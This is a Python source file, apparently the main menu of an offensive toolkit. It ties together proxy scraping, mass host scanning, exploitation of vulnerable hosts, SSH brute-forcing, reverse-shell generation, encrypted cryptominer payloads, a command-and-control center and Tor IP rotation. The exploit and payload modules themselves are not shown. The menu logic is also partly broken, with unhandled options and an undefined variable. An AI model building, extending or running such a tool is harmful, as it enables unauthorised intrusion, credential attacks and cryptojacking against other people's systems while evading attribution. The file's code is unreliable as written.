from globals import (
    global_hosts,
    global_live_hosts,
    global_vulnerable_hosts,
    global_scraped_proxies,
    global_tested_proxies,
    global_active_sessions,
    global_config,
    global_generated_payloads,
    global_error_log,
    global_scan_stats,
    global_wordlist_paths,
    pause_event,
    stop_event,
)
from modules.proxy_handler import (
    load_proxies,
    test_proxies,
    scrape_proxies,
    add_proxy_sources,
    load_checked_proxies,
    clear_proxies,
)
from modules.host_handler import (
    load_hosts,
    load_ip_ranges,
    test_hosts,
    load_previous_hosts,
)

from modules.scanner import scan_hosts, show_results, clear_results
from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
from modules.bruteforce import load_wordlists, bruteforce_ssh
from modules.config_handler import configure_settings
from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
from modules.go_bruteforce import run_golang_bruteforce
from modules.stats_handler import display_statistics

import os
import keyboard
import threading
from termcolor import colored
import time

# Dictionary to track active background tasks
active_tasks = {}

# Proxy, Host, and Bruteforce statistics
proxy_stats = {"total": 0, "testing": 0, "valid": 0, "dead": 0, "remaining": 0}
host_stats = {"total": 0, "scanning": 0, "valid": 0, "dead": 0, "remaining": 0}
brute_stats = {"running": 0, "success": 0, "failed": 0}

# Flag to return to menu from any scan
return_to_menu = threading.Event()


def stop_all_background_tasks():
    """Gracefully stop all running background tasks."""
    print("[INFO] Stopping all background tasks...")
    stop_event.set()
    for task_name, thread in active_tasks.items():
        if thread.is_alive():
            print(f"[INFO] Stopping {task_name}...")
            thread.join()


def toggle_background_task(task_name, function, *args):
    """Manage background tasks:
    - Start new task if not running
    - Allow user to return to menu while scan continues
    - Resume existing task if already running
    """
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        print(f"[INFO] Resuming {task_name}...")
        active_tasks[task_name].join()
    else:
        print(f"[INFO] Starting {task_name} in background...")
        return_to_menu.clear()  # Reset return-to-menu flag
        thread = threading.Thread(target=function, args=args, daemon=True)
        active_tasks[task_name] = thread
        thread.start()


def return_to_main():
    """Allows the user to return to the main menu while a scan is running."""
    print("[INFO] Returning to the main menu. Scanning will continue in the background.")
    return_to_menu.set()


def status_text(task_name):
    """Display 'CURRENTLY RUNNING' status in green for active tasks."""
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        return colored("[CURRENTLY RUNNING]", "green")
    return ""

def display_statistics():
    """Show system stats dynamically with color enhancements."""
    os.system("clear")  # Clear screen
    print("\n" + colored("[ SYSTEM STATISTICS ]", "cyan", attrs=["bold"]))

    print(f"🟢 Active Background Tasks: {colored(len(active_tasks), 'green')}\n")

    print(f"📡 {colored('Proxies:', 'blue', attrs=['bold'])} "
          f"{colored(proxy_stats.get('total', 0), 'white')} Total | "
          f"{colored(proxy_stats.get('valid', 0), 'green')} Valid | "
          f"{colored(proxy_stats.get('dead', 0), 'red')} Dead | "
          f"{colored(proxy_stats.get('remaining', 0), 'yellow')} Remaining")

    print(f"🌐 {colored('Hosts:', 'magenta', attrs=['bold'])} "
          f"{colored(host_stats.get('total', 0), 'white')} Total | "
          f"{colored(host_stats.get('valid', 0), 'green')} Live | "
          f"{colored(host_stats.get('dead', 0), 'red')} Dead | "
          f"{colored(host_stats.get('remaining', 0), 'yellow')} Remaining")

    print(f"🔑 {colored('Brute-force:', 'cyan', attrs=['bold'])} "
          f"{colored(brute_stats.get('running', 0), 'white')} Running | "
          f"{colored(brute_stats.get('success', 0), 'green')} Success | "
          f"{colored(brute_stats.get('failed', 0), 'red')} Failed\n")
    
def main_menu():
    while True:
        print("\033[H\033[J", end="")  # Clear screen
        display_statistics()

        print("\n[ Main Menu ]")
        print(f"1.) Add Proxy Sources")
        print(f"2.) Scrape Proxies")
        print(f"3.) Load Proxies")
        print(f"4.) Test Proxies {status_text('proxy_test')}")
        print(f"5.) Load Checked Proxies")
        print(f"6.) Clear Proxies")
        print(f"7.) Load Hosts")
        print(f"8.) Load IP Ranges")
        print(f"9.) Load Previously Tested Hosts")
        print(f"10.) Test Hosts {status_text('host_test')}")
        print(f"11.) Scan Hosts {status_text('host_scan')}")
        print(f"12.) Show Results")
        print(f"13.) Clear Results")
        print(f"14.) Identify Vulnerabilities")
        print(f"15.) Exploit Vulnerable Hosts")
        print(f"16.) Clear All Chunks")
        print(f"17.) Split Large CSVs")
        print(f"18.) Python SSH Bruteforce {status_text('python_brute')}")
        print(f"19.) Golang SSH Bruteforce (w/ SOCKS5) {status_text('go_brute')}")
        print(f"20.) Configuration Settings")
        print(f"21.) Generate Reverse Shell")
        print(f"22.) Manage Cryptominers")
        print(f"23.) Command and Control Center")
        print(f"24.) Start/Stop Tor Proxy")
        print(f"25.) Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            add_proxy_sources()
        elif choice == "2":
            scrape_proxies()
        elif choice == "3":
            global_scraped_proxies[:] = load_proxies()
        elif choice == "4":
            toggle_background_task("proxy_test", test_proxies, global_scraped_proxies)
        elif choice == "5":
            global_tested_proxies[:] = load_checked_proxies()
        elif choice == "6":
            clear_proxies()
        elif choice == "7":
            global_hosts[:] = load_hosts()
        elif choice == "8":
            global_hosts[:] = load_ip_ranges()
        elif choice == "9":
            global_hosts[:] = load_previous_hosts()
        elif choice == "10":
            toggle_background_task("host_test", test_hosts, global_hosts, global_tested_proxies)
        elif choice == "11":
            toggle_background_task("host_scan", scan_hosts)
        elif choice == "12":
            show_results()
        elif choice == "13":
            clear_results()
        elif choice == "14":
            global_vulnerable_hosts[:] = identify_vulnerable_hosts(global_live_hosts)
        elif choice == "15":
            exploit_vulnerable_hosts(global_vulnerable_hosts)
        elif choice == "16":
            clear_all_chunks()
        elif choice == "17":
            split_large_csvs("ip_ranges", 200)
        elif choice == "18":
            toggle_background_task("python_brute", bruteforce_ssh, global_live_hosts)
        elif choice == "19":
            toggle_background_task("go_brute", run_golang_bruteforce, global_live_hosts)
        elif choice == "20":
            configure_settings()
        elif choice == "25":
            stop_all_background_tasks()
        elif choice == "26":  # New Option to Enable Web Server
            if not web_config["enabled"]:
                web_config["enabled"] = True
                print("[INFO] Starting Web Interface...")
                os.system("python3 webapp/app.py &")  # Run Flask in background
            else:
                print("[INFO] Web Interface already running.")    
            break



def setup_keyboard_controls():
    keyboard.add_hotkey("F5", lambda: pause_event.set() if not pause_event.is_set() else pause_event.clear())
    keyboard.add_hotkey("F6", lambda: stop_event.set())
    keyboard.add_hotkey("F7", return_to_main)
    print("[INFO] Press F5 to pause/resume, F6 to stop scanning, and F7 to return to menu.")


setup_keyboard_controls()

if __name__ == "__main__":
    main_menu()
